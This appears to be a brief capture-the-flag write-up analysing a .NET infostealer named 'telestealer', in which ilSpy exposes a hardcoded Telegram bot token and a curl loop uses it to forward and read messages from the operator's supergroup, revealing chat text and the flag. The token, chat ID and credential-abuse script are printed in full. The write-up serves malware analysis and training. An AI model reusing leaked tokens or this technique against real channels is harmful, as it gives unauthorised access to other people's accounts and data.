- Deobfuscate `telestealer` and get the malicious binary saved
- ilSpy reveals telegram bot information

> Line 841: `TG_Access = "8485770488:AAH8YOjqaRckDPIy7xNwZN2KcaLx6EME-L0";`

- This can be used in the API, found that I can forward the messages to itself and extract the contents after getting supergroup ID

```sh
for i in {1..50}; do
  curl -s -X POST "https://api.telegram.org/bot8485770488:AAH8YOjqaRckDPIy7xNwZN2KcaLx6EME-L0/forwardMessage" \
    -d "chat_id=-1003264841385" \
    -d "from_chat_id=-1003264841385" \
    -d "message_id=$i" | jq -c '.result.text // .result.caption'
done

null
null
"YAYAYAYAYAYAYAYAYAYAYAYAYAYAYAYAY pulled those stealer logs"
"l33t haxx3r"
"flag{5f5b173825732f5404acf2f680057153}"
"/data"
"/passwords"
"flag"
"@nohusuro what documents do we have?"
```
